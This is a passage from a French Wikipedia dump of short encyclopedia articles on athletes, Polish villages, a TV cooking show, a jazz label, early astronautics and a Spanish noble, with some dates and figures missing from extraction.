Le tournoi de Zagreb est un tournoi de tennis professionnel masculin. L'édition 2015, classée en catégorie ATP 250 Series, s'est disputée du 2 au .

</doc>
<doc id="8729152" url="https://fr.wikipedia.org/wiki?curid=8729152" title="Leprogres.fr">
Leprogres.fr



</doc>
<doc id="8729153" url="https://fr.wikipedia.org/wiki?curid=8729153" title="Khiji Chandeshwori">
Khiji Chandeshwori

Khiji Chandeshwari (en ) est un comité de développement villageois du Népal situé dans le district d'Okhaldhunga. Au recensement de 2011, il comptait .

</doc>
<doc id="8729154" url="https://fr.wikipedia.org/wiki?curid=8729154" title="Liste des Ambassadeurs de France en Grande-Bretagne">
Liste des Ambassadeurs de France en Grande-Bretagne



</doc>
<doc id="8729156" url="https://fr.wikipedia.org/wiki?curid=8729156" title="Sergio Cidoncha">
Sergio Cidoncha

Sergio Cidoncha Fernández, né le à L'Escurial, est un footballeur espagnol évoluant actuellement au poste de milieu offensif au Kerala Blasters.

</doc>
<doc id="8729160" url="https://fr.wikipedia.org/wiki?curid=8729160" title="Raad Hammoudi">
Raad Hammoudi

Raad Hammoudi Salman () (né le à Bagdad en Irak) est un joueur de football international irakien, qui évoluait au poste de gardien de but.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il joue 132 matchs (pour aucun but inscrit) entre 1976 et 1987. 
Il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986. Lors du mondial, il joue deux matchs : contre le Paraguay et la Belgique.
Il participe également aux JO de 1984. Il joue trois matchs lors du tournoi olympique.

</doc>
<doc id="8729162" url="https://fr.wikipedia.org/wiki?curid=8729162" title="Engrenage international">
Engrenage international



</doc>
<doc id="8729163" url="https://fr.wikipedia.org/wiki?curid=8729163" title="Engrenage International">
Engrenage International



</doc>
<doc id="8729173" url="https://fr.wikipedia.org/wiki?curid=8729173" title="Vongozero">
Vongozero

Vongorezo (en alphabet cyrillique "Вонгозеро") est un roman d'anticipation russe de Yana Vagner dont l'édition originale en russe est sortie en 2011 à Moscou chez Eksmo.
Certains critiques le rattachent aux romans post-apocalyptiques
C'est le premier livre de l'auteur. Il a été adapté en série télévisée par la télévision russe à partir de 2019.
Intrigue.
Le récit relate ce que devient une famille russe s'échappant du centre du pays alors qu'une pandémie se développe sur toute la planète. L'odyssée est racontée de l'intérieur par la narratrice Anna, accompagnée d'abord de son mari, de son fils et de son beau-père, puis par la première femme de son mari et leur fils, qui ont réussi à s'échapper de Moscou malgré la quarantaine, et de diverses personnes qui s'agrègent au groupe dans un monde hostile, sans ordre public. Ils finissent par arriver dans une maison forestière en Carélie.
Prix et récompenses.
"Vongozero" a été nommé pour le en Russie.
La version française, traduite par Raphaëlle Pache a obtenu une mention spéciale au Prix Russophonie 2015 de la meilleure traduction. Elle a été sélectionnée en pour le Grand prix des lectrices de Elle
Éditions.
Outre le russe et le français, l'ouvrage a paru dans les langues suivantes :

</doc>
<doc id="8729174" url="https://fr.wikipedia.org/wiki?curid=8729174" title="Jean Tissandier">
Jean Tissandier

Jean Tissandier, ou parfois Jean de La Tissanderie, mort en 1348, est un prélat français du qui fut évêque de Lodève de 1322 à 1324, puis évêque de Rieux de 1324 à 1348.
Biographie.
Originaire de Cahors, il fut un religieux franciscain au couvent des Cordeliers de Toulouse. Il devint ensuite bibliothécaire de la cour pontificale d'Avignon, fut nommé évêque de Lodève en 1322 par le pape Jean XXII, puis évêque de Rieux en 1324. Il mourut en 1348.
Il fonda dans le couvent des Cordeliers de Toulouse la chapelle Notre-Dame de Rieux (détruite en 1804) et fut le mécène du Maître de Rieux, qui en réalisa la décoration et le représenta plusieurs fois. Le cardinal Pierre de Foix termina les travaux de la chapelle et Jean Tissandier y fut inhumé ; son gisant est visible au musée des Augustins.
Notes et références.
http://www.gegeloccitan-photo.fr/article-couvent-musee-des-augustins-salle-capitulaire-toulouse-76169867.html

</doc>
<doc id="8729181" url="https://fr.wikipedia.org/wiki?curid=8729181" title="Delbourg">
Delbourg



</doc>
<doc id="8729183" url="https://fr.wikipedia.org/wiki?curid=8729183" title="K. J. Wright">
K. J. Wright

Kenneth Bernard Wright, Jr., dit K. J. Wright, né le à Memphis, est un joueur américain de football américain.
Depuis 2021, ce linebacker joue pour les Raiders de Las Vegas en National Football League (NFL) après avoir évolué pour les Seahawks de Seattle (2011-2020).

</doc>
<doc id="8729189" url="https://fr.wikipedia.org/wiki?curid=8729189" title="VVC Vught">
VVC Vught

VVC Vught est un club néerlandais de volley-ball fondé en 1968 et basé à Vught qui évolue pour la saison 2014-2015 en Topdivisie dames.
Effectifs.
Saison 2014-2015.
Entraîneur : Marcel de Laat 

</doc>
<doc id="8729190" url="https://fr.wikipedia.org/wiki?curid=8729190" title="The Testament (album de Cormega)">
The Testament (album de Cormega)

The Testament est le quatrième album studio de Cormega, sorti le .
Il s'agit en fait du premier album du rappeur, enregistré au milieu des années 1990 et prévu pour être publié chez Def Jam. Après plusieurs années d'attente, Cormega a récupéré les bandes originales et l'album est sorti sur le label Legal Hustle Records.
L'album s'est classé au Top Independent Albums et au Top R&amp;B/Hip-Hop Albums.

</doc>
<doc id="8729191" url="https://fr.wikipedia.org/wiki?curid=8729191" title="PONPONPON">
PONPONPON



</doc>
<doc id="8729193" url="https://fr.wikipedia.org/wiki?curid=8729193" title="Tsukematsukeru">
Tsukematsukeru



</doc>
<doc id="8729194" url="https://fr.wikipedia.org/wiki?curid=8729194" title="Voler (chanson)">
Voler (chanson)

Voler est une chanson interprétée en duo par Michel Sardou et Céline Dion, sortie sur l'album de Sardou "Être une femme 2010" et parue en single le . La chanson était initialement prévue pour être chantée par Michel Sardou seulement, et c'est sa choriste, Delphine Elbé, qui a eu l'idée du duo.
La chanson évoque la passion de Sardou à piloter un avion.
Autour de la chanson.
Clip vidéo.
La chanson a fait l'objet d'un clip vidéo dans lequel des images de Céline Dion ont été intégrées. Ainsi, les deux artistes ne se sont pas rencontrés pour sa réalisation.
Propos de Michel Sardou.
Quatre ans plus tard, sur le plateau de "On n'est pas couché" le , Michel Sardou exprime son mécontentement au sujet du titre. Il reproche aux « imbéciles de maisons de disques » d'avoir choisi, pour tourner le clip, un comédien ne lui ressemblant pas, et déplore également n'avoir pas pu rencontrer la chanteuse pour enregistrer le morceau. Il qualifie même cette expérience personnelle de « merdier ».
Versions live.
La chanson est incluse lors du spectacle "Confidences et retrouvailles - Live 2011" où elle est interprétée avec Delphine Elbé, sa choriste. Lors de la première tournée des "Grands Moments", qui reprend l'essentiel de ses plus grands succès, "Voler" est également chantée en compagnie de Delphine Elbé.

</doc>
<doc id="8729195" url="https://fr.wikipedia.org/wiki?curid=8729195" title="Khalil Allawi">
Khalil Allawi

Khalil Mohammed Allawi () (né le en Irak) est un footballeur international irakien, qui évoluait au poste de défenseur.
Son frère, Karim, était également footballeur.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il joue 81 matchs entre 1981 et 1989. 
Il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986. Lors du mondial, il joue trois matchs : contre le Paraguay, la Belgique et le Mexique.
Il participe également aux JO de 1984. Il joue deux matchs lors du tournoi olympique.

</doc>
<doc id="8729197" url="https://fr.wikipedia.org/wiki?curid=8729197" title="Mottai Nightland">
Mottai Nightland



</doc>
<doc id="8729202" url="https://fr.wikipedia.org/wiki?curid=8729202" title="Steven Hauschka">
Steven Hauschka

Stephen Theodore Hauschka, dit Steven Hauschka, né le à Needham, est un joueur américain de football américain qui a évolué au poste de kicker en National Football League (NFL) pendant treize saisons.
Il a joué aux Ravens de Baltimore (2008–2009), aux Falcons d'Atlanta (2009), aux Broncos de Denver (2010) aux Seahawks de Seattle (2011-2016), aux Bills de Buffalo (2017-2019) et aux Jaguars de Jacksonville (2020).
Jeunesse.
Stephen Hauschka a grandi à Needham, dans le Massachusetts, où il a fait partie de l'équipe de football des Rockets de la Needham High School, de l'équipe de basket-ball et de l'équipe de la crosse. Il a également joué du trombone dans le groupe de concert NHS et le groupe de jazz NHS. Il ne jouait pas au football américain pour les Rockets, même s'il deviendra un kicker gagnant de la NFL.
Carrière professionnelle.
Un jour après avoir été libéré par les Broncos de Denver, Hauschka est réclamé au ballottage par les Seahawks de Seattle le .
Le , il signe une prolongation de contrat de trois ans d'un montant de 9,1 millions de dollars avec les Seahawks de Seattle.
Le , Hauschka signe un contrat de quatre ans avec les Bills de Buffalo.
Le , il signe une prolongation de contrat de deux ans d'un montant de 8 millions de dollars avec les Bills.
Il est libéré par les Bills le peu avant le début de la saison régulière 2020 après la sélection de Tyler Bass dans la draft 2020 de la NFL.
Le , Hauschka est engagé par les Jaguars de Jacksonville. Il est libéré le , un jour après avoir raté ses deux tentatives de field goal pendant un match contre les Texans de Houston.
Il annonce prendre sa retraite du football américain professionnel le .
Vie personnelle.
En juin 2011, Hauschka épouse Lindsey Jones.

</doc>
<doc id="8729215" url="https://fr.wikipedia.org/wiki?curid=8729215" title="Tommy Ford">
Tommy Ford

Thomas « Tommy » Ford, né le à Bend, est un skieur alpin américain. Il remporte la première victoire de sa carrière en Coupe du monde le en gagnant le slalom géant de Beaver Creek.
Carrière.
Il entre en activité dans le cirque blanc à partir de l'hiver 2004-2005. Il obtient des bons résultats chez les juniors avec une place en slalom géant aux Championnats du monde junior 2008 et une médaille d'argent en slalom en 2009, où il accompagne son compatriote Nolan Kasper sur le podium (). Il commence sa carrière en Coupe du monde en au slalom géant de Sölden puis marque ses premiers points à Alta Badia quelques semaines plus tard. En , il participe aux Jeux olympiques de Vancouver, et se classe du slalom géant. C'est en 2011, qu'il réalise son meilleur résultat pour des années en Coupe du monde avec une onzième place au super G d'Hinterstoder. Il se rend juste après aux Championnats du monde à Garmisch-Partenkirchen où il obtient une bonne en super G. En , il se fracture le fémur après une chute à La Clusaz. Aux Championnats du monde 2015, il est du slalom géant. En , il obtient son premier top dix en Coupe du monde avec une dixième place à Beaver Creek. Aux Jeux olympiques d'hiver de 2018, il est du slalom géant. 
Enfin à l'âge de 30 ans et à son départ en Coupe du monde depuis 2009, il remporte la première course de sa carrière et monte sur son premier podium en dominant le slalom géant de Beaver Creek le , devant son public, réalisant le meilleur temps de la première manche et le deuxième du second acte pour devancer de 80/100 de seconde Henrik Kristoffersen et de 1 s 23 son compatriote Leif Kristian Nestvold-Haugen.
Lors de la saison 2020-2021, il recule au classement mondial de slalom géant (treizième), montant sur un seul podium en Coupe du monde à Santa Catarina (). Cela est dû à une chute au slalom géant d'Adelboden entraînant une blessure au genou, qui met fin à la saison de Ford..

</doc>
<doc id="8729218" url="https://fr.wikipedia.org/wiki?curid=8729218" title="Needham (Massachusetts)">
Needham (Massachusetts)

Needham est une ville du comté de Norfolk au Massachusetts. Selon le recensement de 2010, sa population s’élève à .
Démographie.
Selon l""', pour la période 2011-2015, 84,32 % de la population âgée de plus de 5 ans déclare parler anglais à la maison, alors que 2,77 % déclare parler une langue chinoise, 2,61 % le russe, 1,98 % l'espagnol, 0,91 % le persan, 0,82 % l'italien, 0,74 % l'hindi, 0,61 % le français, 0,50 % le russe et 4,75 % une autre langue.

</doc>
<doc id="8729224" url="https://fr.wikipedia.org/wiki?curid=8729224" title="Remparts de Villefranche-de-Conflent">
Remparts de Villefranche-de-Conflent

Les remparts de Villefranche-de-Conflent sont l'ensemble des fortifications entourant la ville de Villefranche-de-Conflent, dans le département français des Pyrénées-Orientales. 
Histoire.
Les remparts ont été construits et modifiés du à un endroit stratégique permettant de contrôler les vallées de la Têt et de son affluent le Cady, combinés avec le fort Libéria les surplombant. 
Les remparts de Villefranche-de-Conflent, ainsi que les terrains les entourant, ont été classés au titre des monuments historiques, en trois étapes, en 1920, 1933 et 1938.

</doc>
<doc id="8729229" url="https://fr.wikipedia.org/wiki?curid=8729229" title="Fabrice Le Hénanff">
Fabrice Le Hénanff

Fabrice Le Hénanff (né le à Quimperlé) est un dessinateur et un scénariste de bande dessinée français.
Biographie.
 Le Hénanff Fabrice naît en 1972 à Quimperlé. Il est à la fois dessinateur, coloriste et scénariste.

</doc>
<doc id="8729234" url="https://fr.wikipedia.org/wiki?curid=8729234" title="Jacques Bro">
Jacques Bro

Jacques Bro peut faire référence à :
Jacques Bros peut faire référence à :

</doc>
<doc id="8729235" url="https://fr.wikipedia.org/wiki?curid=8729235" title="Kamienica (Mazovie)">
Kamienica (Mazovie)

Kamienica (prononciation : ) est un village polonais de la gmina de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village compte approximativement une population de 392 habitants en 2006.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729236" url="https://fr.wikipedia.org/wiki?curid=8729236" title="Composition des équipes au Championnat du monde masculin de handball 2015">
Composition des équipes au Championnat du monde masculin de handball 2015

Cet article détaille la composition des équipes ayant participé au Championnat du monde masculin de handball 2015. Chaque équipe est composée de 16 joueurs auxquels ont pu être ajoutés un ou deux joueur(s) remplaçant(s). À noter toutefois que tous les joueurs listés ont été inscrits sur au moins une feuille de match.
Le nombre de sélection, le nombre de buts marqués et les clubs sont ceux avant la compétition (au 15 janvier 2015).
Équipes.
&lt;section begin=Brésil /&gt;
! scope=row colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center| Gardiens de but
! scope=row colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center| Ailiers
! scope=row colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center| Arrières
! scope=row colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center| Demi-centres
! scope=row colspan=11 style="background: #FFFFFF; border: 1px solid #aaa;" align=center|Pivot
&lt;section end=Brésil /&gt;
&lt;section begin=Pologne /&gt;
&lt;section end=Pologne /&gt;

</doc>
<doc id="8729241" url="https://fr.wikipedia.org/wiki?curid=8729241" title="Elijah Millsap">
Elijah Millsap

Elijah Millsap, né le , est un joueur américain de basket-ball. C'est le frère cadet de Paul Millsap. Il a joué pour divers clubs de NBA D-League, et a fait ses débuts en NBA le pour le Jazz de l'Utah.

</doc>
<doc id="8729243" url="https://fr.wikipedia.org/wiki?curid=8729243" title="Kaliště (Jihlava)">
Kaliště (Jihlava)



</doc>
<doc id="8729244" url="https://fr.wikipedia.org/wiki?curid=8729244" title="Abdul-Rahim Hamed">
Abdul-Rahim Hamed

Abdul-Rahim Hamed Aufi (né le en Irak) est un footballeur international irakien, qui évoluait au poste d'attaquant.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986. Lors du mondial, il joue trois matchs : contre le Paraguay, la Belgique et le Mexique
Il participe également aux JO de 1984.

</doc>
<doc id="8729245" url="https://fr.wikipedia.org/wiki?curid=8729245" title="Cacous">
Cacous



</doc>
<doc id="8729249" url="https://fr.wikipedia.org/wiki?curid=8729249" title="Venceslas Dédina">
Venceslas Dédina

 
Venceslas Dédina, parfois orthographié Wenceslas Dedina, ou en tchèque Václav Dědina, né le à Straky (Autriche-Hongrie) et mort le à Paris, est un graveur, peintre et sculpteur français d'origine austro-hongroise.
Il est le frère du peintre Jan Dědina.
Biographie.
Venceslas Dédina naît à Straky, dans une province tchèque de l'Empire austro-hongrois. En 1895, il choisit de déserter de l'armée autrichienne et s'enfuit pour Paris avec son frère ainé Jan (le peintre). Ils s'installent successivement rue Beaunier ( arrondissement), rue Cels (), rue Portefoin (), rue du Chemin Vert () puis finalement au 15 rue Payenne (). Il se marie avec une savoyarde et a cinq enfants. Naturalisé Français en 1913, il est incorporé dans l'armée en et semble s'être distingué pendant la Première Guerre mondiale. Il meurt dans le arrondissement de Paris le .
Il est le père de Daniel V. Dédina (1906-1984), agent de voyage, conseil en tourisme, éditeur de presse touristique professionnelle, pionnier de l'industrie du tourisme moderne, fondateur de WATA (World Association of Travel Agencies) basé à Genève.
Œuvre.
Venceslas Dédina fait ses études artistiques à l'Académie des beaux-arts de Prague. Dessinateur et graveur scrupuleux, ses gravures sont nombreuses à être reproduites dans les revues. Cependant, depuis toujours attiré par la peinture, il finit par s'y consacrer, peignant tant à l'huile qu'à la cire. Il exécute aussi de nombreux pastels.
Bien connu à Prague, il participe à des expositions, ainsi que dans d'autres villes tchèques comme Poděbrady, non loin de sa ville natale. Il obtient une mention honorable à l'Exposition universelle de 1900 de Paris, où il expose avec les peintres autrichiens. En France, devenu sociétaire du Salon des artistes français en 1927, le public peut régulièrement découvrir ses peintures au Salon des indépendants, au Salon de la Société nationale des beaux-arts, à la Galerie Drouant à Paris et au Salon de Clichy. Plusieurs de ses œuvres, paysages et bateaux sur la Seine, sont reproduites dans la "Revue moderne". En 1930, le "Dictionnaire biographique des artistes contemporains" cite "Chevaux aux Sables", "Temps de neige" et "À Paris".
 C'est dans cette dernière manière que Venceslas Dédina semble peindre dans les années 1930, où la critique remarque , ses .
Expositions.
Venceslas Dédina exposa aux salons cités plus haut. Les dates attestées sont les suivantes :

</doc>
<doc id="8729250" url="https://fr.wikipedia.org/wiki?curid=8729250" title="Simon Andreassen">
Simon Andreassen

Simon Andreassen, né le , est un coureur cycliste danois, spécialiste du cross-country VTT et du cyclo-cross.
Biographie.
Simon Andreassen naît le au Danemark.
En , il devient champion du monde de cross-country juniors. En , il décroche en solitaire le titre de champion du monde de cyclo-cross juniors, devant le favori belge Eli Iserbyt. En septembre de la même année, il devient le premier coureur à conserver son titre de champion du monde de cross-country juniors.

</doc>
<doc id="8729270" url="https://fr.wikipedia.org/wiki?curid=8729270" title="Karolinowo (Załuski)">
Karolinowo (Załuski)

Karolinowo (prononciation : ) est un village polonais de la "gmina" de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord de Załuski (siège de la "gmina"), au sud-est de Płońsk (siège du "powiat") et à au nord-ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de 160 habitants en 2008.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729274" url="https://fr.wikipedia.org/wiki?curid=8729274" title="Norbert, commis d'office">
Norbert, commis d'office

Norbert, commis d'office est une série de télé-réalité française diffusée sur 6ter du au . Elle met en scène Norbert Tarayre, chef cuisinier et propriétaire de restaurants, qui enquête sur des .
Concept.
Les candidats (criminels de la cuisine dans l'émission "Norbert, commis d'office") sont de tous genres, mères de famille, pères célibataires, grands-mères ou encore jeunes et cuisinent depuis des années. Mais leurs familles et amis ne supportent plus leurs plats qui sont trop gras, trop lourds et souvent ratés. Les proches n'osent pas avouer aux à quel point leur cuisine n'est pas bonne. C'est la raison pour laquelle ils "portent plainte" auprès de Norbert Tarayre. Norbert est donc "commis d'office" (comme un avocat), pour remettre ces dans le droit chemin. Deux enquêtes sont transmises à Norbert pour chaque épisode.
Émissions.
Saison 1 (2015).
La première saison a été diffusée entre le et le à 20 h 50 sur 6ter. 
Lors des deux premières diffusions, deux épisodes inédits ont été diffusés, puis les semaines suivantes, un épisode inédit avec une rediffusion.
Saison 2 (2015).
La deuxième saison a été diffusée entre le et le à 20 h 50 sur 6ter. 
Un épisode spécial, "Les meilleures astuces de Norbert", a été diffusée après le premier épisode, le à 22 h 00.
Saison 3 (2016).
La troisième saison a été diffusée entre le et le à sur 6ter. Le premier épisode, "Ils reviennent !", est dédié à l’association, "Un rêve, un sourire".
Un épisode spécial, "Le pire du pire", a été diffusée après le second épisode, le à .
Saison 4 (2017).
La quatrième saison a été diffusée entre le et le à sur 6ter.
Un épisode spécial, "Le pire du pire", a été diffusée après le premier épisode, le à .
Saison 5 (2017-2018).
La cinquième saison a été diffusée du au à 21 h 00 sur 6ter.
Saison 6 (2019).
La sixième saison a été diffusée du au à 21 h 00 sur 6ter.
Audiences.
Graphique.
Audiences par saison

</doc>
<doc id="8729275" url="https://fr.wikipedia.org/wiki?curid=8729275" title="Cap Kanine">
Cap Kanine

Le cap Kanine (en , "Kanin Nos") est un cap situé à l'extrémité nord de la péninsule de Kanine, dans le District autonome de Nénétsie au nord-ouest de la Russie. La ligne qui relie le cap Kanine au cap Sviatoï sur la péninsule de Kola marque la limite entre la mer Blanche (au sud) et la mer de Barents (au Nord).
Le polygone de Tchija, situé à proximité du cap Kanine, est une zone d'impact des missiles balistiques intercontinentaux russes.

</doc>
<doc id="8729277" url="https://fr.wikipedia.org/wiki?curid=8729277" title="Koryciska (Płońsk)">
Koryciska (Płońsk)

Koryciska (prononciation : ) est un village polonais de la gmina de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-est de Załuski (siège de la "gmina"), au sud-est de Płońsk (siège du "powiat") et à au nord-ouest de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729284" url="https://fr.wikipedia.org/wiki?curid=8729284" title="Festival du film de Sundance 2010">
Festival du film de Sundance 2010

Le Festival du film de Sundance 2010, du festival ("") organisé par le , s'est déroulé du 21 au à Park City (Utah).

</doc>
<doc id="8729289" url="https://fr.wikipedia.org/wiki?curid=8729289" title="Fatah Nsaief">
Fatah Nsaief

Abdul-Fatah Nsaief Jassim () (né le en Irak) est un joueur de football international irakien, qui évoluait au poste de gardien de but.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il joue 52 matchs (pour aucun but) entre 1977 et 1987. 
Il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986. Lors du mondial, il joue un match contre le Mexique.
Il participe également aux JO de 1984.

</doc>
<doc id="8729299" url="https://fr.wikipedia.org/wiki?curid=8729299" title="Ali Hussein">
Ali Hussein

Ali Hussein Shihab () (né le en Irak et mort le ) est un footballeur international irakien, qui évoluait au poste de milieu de terrain.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986.
Il participe également aux Jeux olympiques de 1984 qui se déroulent à Los Angeles.

</doc>
<doc id="8729300" url="https://fr.wikipedia.org/wiki?curid=8729300" title="Avant 1957 en astronautique">
Avant 1957 en astronautique

Cette page présente la chronologie des événements qui se sont produits avant l'année 1957 dans le domaine de l'astronautique, que ce soit dans le domaine technique que celui des idées, croyances et théories.
Chronologie.
1903.
Dans son ouvrage théorique "L'Exploration de l'espace cosmique par des engins à réaction", Constantin Tsiolkovski décrit une fusée à propergol liquide (hydrogène/oxygène) qui serait assez puissante pour se libérer de l'attraction terrestre et atteindre d'autres planètes. Il écrit la loi fondamentale du rapport de masse impliquant le découpage de la fusée en plusieurs étages.
Afin de faire comprendre le principe de la propusion à réaction, Constantin Tsiolkovski a proposé sa fameuse expérience "de la barque" : une personne se trouve démunie d'avirons dans une barque à l'écart de la rive. Il veut rejoindre cette rive. Il remarque que la barque est chargée d'une certaine quantité de pierres et a l'idée de lancer, une à une et le plus vivement possible, ces pierres dans la direction opposée à la rive. Effectivement, à la quantité de mouvement des pierres jetées dans un sens correspond une quantité de mouvement égale pour la barque dans l'autre sens.

</doc>
<doc id="8729307" url="https://fr.wikipedia.org/wiki?curid=8729307" title="Fresh Sound Records">
Fresh Sound Records

Fresh Sound Records est un label discographique espagnol de jazz fondée en 1983 à Barcelone par Jordi Pujol.
Histoire.
En 1983, un ingénieur du textile barcelonais, Jordi Pujol, crée Fresh Sound Records qui se consacre au jazz West Coast et aux artistes de la côte Est similaires dans leurs recherches esthétiques, un style de jazz largement oublié et méconnu en Europe à cette époque. Le label réédite en 33 tours, avec les pochettes d'origine, de très nombreux albums issus des fonds de catalogue des majors RCA, Capitol, Atlantic, ABC-Paramount Records. Peu à peu le catalogue s'étend à des labels indépendants de l'époque, Andex, Bethlehem, Nocturne, , Liberty, Pacific.
Une deuxième étape est l'enregistrement, à partir de la fin des années 1980, de nouveaux disques par des musiciens West Coast encore vivants à l'époque. Depuis le label produit également des artistes actuels de jazz.
Dans les années 1990, l'entreprise étend ses activités à de jeunes artistes. Sous le sous-label Fresh Sound New Talents, elle a depuis publié des CD d'Ambrose Akinmusire, Seamus Blake/Kurt Rosenwinkel, Rebecca Martin, Brad Mehldau, Dave Liebman et le Lluís Vidal Trio, Chris Cheek, Sam Harris, Max Johnson, Vinny Golia, Maikel Vistel, John Raymond et Nat Su, ainsi que de musiciens de jazz espagnols comme Pablo Ablanedo, Omer Avital, Gorka Benítez, Albert Bover, Vardan Ovsepian, Eladio Reinón, Joan Monné, Mercedes Rossy et Perico Sambeat. Des enregistrements historiques du jazz à Barcelone sont également réédités par l'Orquesta Demon's Jazz.
Pour son catalogue d'artistes et ses rééditions, le label reçoit le Prix de la meilleure réédition ou du meilleur inédit 2012 de l'Académie française du jazz.

</doc>
<doc id="8729314" url="https://fr.wikipedia.org/wiki?curid=8729314" title="William Perry (football américain)">
William Perry (football américain)

William Anthony Perry, né le à Aiken, est un joueur américain de football américain.
Ce defensive tackle et fullback a joué pour les Bears de Chicago de 1985 à 1993 et les Eagles de Philadelphie de 1993 à 1994 en National Football League (NFL).
En référence à son gabarit hors norme, pour , il a été surnommé ' ("Le Réfrigérateur") ou ' ("Le Frigo").
Il est le frère de .

</doc>
<doc id="8729315" url="https://fr.wikipedia.org/wiki?curid=8729315" title="Jaracz">
Jaracz

Jaracz (prononciation : ) est un village polonais de la gmina de Rogoźno dans le powiat d'Oborniki de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au sud-ouest de Rogoźno (siège de la "gmina"), à au nord-est d'Oborniki (siège du powiat), et à au nord de Poznań (capitale de la Grande-Pologne).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Piła.&lt;br&gt;
Depuis 1999, Jaracz est situé dans la voïvodie de Grande-Pologne.
Le village possède une population de en 2006.

</doc>
<doc id="8729323" url="https://fr.wikipedia.org/wiki?curid=8729323" title="Georges Lafont">
Georges Lafont

Georges Lafont est un patronyme francophone porté notamment par :

</doc>
<doc id="8729325" url="https://fr.wikipedia.org/wiki?curid=8729325" title="Gilbert Brown">
Gilbert Brown

Gilbert Jesse Brown, né le à Farmington, est un joueur américain de football américain. Ce nose tackle a joué pour les Packers de Green Bay (1993–1999, 2001–2003) en National Football League (NFL).
Sélectionné par les Vikings du Minnesota lors de la draft 1993 de la NFL, il ne parvient à intégrer l'équipe et est coupé avant le début de la saison, mais trouve preneur lorsqu'il se fait réclamer par les Packers de Green Bay. Il devient peu à peu un membre important dans la ligne défensive des Packers et dispute un total de dix saisons avec la franchise du Wisconsin. Il a remporté le Super Bowl XXXI avec les Packers.
En référence à une danse qu'il faisait lorsqu'il réalisait un plaquage, il a été surnommé "The Gravedigger" (« Le Fossoyeur »).

</doc>
<doc id="8729331" url="https://fr.wikipedia.org/wiki?curid=8729331" title="Équipe cycliste Pôle Continental Wallon Bodysol-Euromillions">
Équipe cycliste Pôle Continental Wallon Bodysol-Euromillions



</doc>
<doc id="8729334" url="https://fr.wikipedia.org/wiki?curid=8729334" title="Luis Méndez Quijada">
Luis Méndez Quijada

Luis Méndez Quijada est un noble espagnol du qui exerça de hautes fonctions auprès de Charles Quint (Charles I d'Espagne) puis de Philippe II. Sa vie est étroitement associée à celle de Don Juan d'Autriche, fils illégitime de Charles Quint, vainqueur de la bataille de Lépante.
Origines.
Luis Méndez Quijada (ou Don Luis de Quijada ou Don Luis Méndez de Quijada) est issu d'une famille de la noblesse castillane, les Quijada, seigneurs de Villagarcia dans la province actuelle de Valladolid (Communauté autonome de Castille et Leon). Son arrière grand-père, Gutierre González Quijada (IV), est cité par Miguel de Cervantes comme l'ancêtre « en ligne directe mâle » de Don Quichotte.
Fonctions publiques.
Au service de Charles Quint.
Entré très jeune comme page au service du roi Charles I d'Espagne (Empereur Charles Quint d'Allemagne), il accompagna ce dernier en tant que majordome dans ses nombreuses campagnes militaires en Flandres, Italie, Allemagne, France et Afrique du Nord. Il commanda en 1535 une expédition militaire contre la ville de Tunis et fut blessé lors de la prise victorieuse du port de La Goulette. En 1554, il reçut de l'Empereur la charge d'héberger, au sein de sa famille et dans le plus grand secret, l'enfant né en 1545 (ou 1547) de sa liaison illégitime avec Barbara Blomberg nommé Jeromín (le futur Don Juan d'Autriche). Jeromín avait été confié peu de temps après sa naissance à Francisco Massy et Alma de Medina, un couple pauvre de la ville de Leganés (communauté de Madrid), ignorant tout des liens de filiation de l'enfant. En 1554, conscient de l'incapacité de ce couple à fournir une éducation convenable à l'enfant, l'Empereur le confia à la garde de Luis Méndez Quijada et son épouse, Madalena de Ulloa, couple sans enfant, qui le prirent en charge dans leur château de Villagarcia de Campos. Contrairement à Luis Méndez Quijada, qui exerçait de façon semi-clandestine la fonction de précepteur d'un enfant royal (« "ayo" »), son épouse ne connaissait pas la filiation de Jeromín.
Après son abdication en 1556, l'ex-Empereur demanda à Luis Méndez Quijada de continuer à le servir en tant que majordome au monastère de Yuste, son nouveau lieu de résidence. Il s'installa alors dans le village de Cuacos, proche de Yuste. À l'été 1558, à la demande de l'ex-Empereur, Luis Mendez Quijada demanda à son épouse de le rejoindre avec l'enfant, ce qui permit des rencontres occasionnelles entre le monarque et son fils, sans, semble-t-il, que ne lui soit révélé à ce moment-là le mystère de sa naissance. Luis Méndez Quijada était présent en tant que premier chambellan lors des deniers instants de vie de l'Empereur et recueillit ses dernières paroles , le . 
Au service de Philippe II.
Le , à l'occasion d'une chasse royale près du (Valladolid), Luis Méndez Quijada organisa la première rencontre entre le nouveau roi Philippe II et son demi-frère. Conformément aux dispositions du testament de Charles Quint, le roi reconnut alors publiquement son demi-frère Jeromín comme membre à part entière de la famille royale, avec sa maison propre, sous le nom de Don Juan d'Autriche.
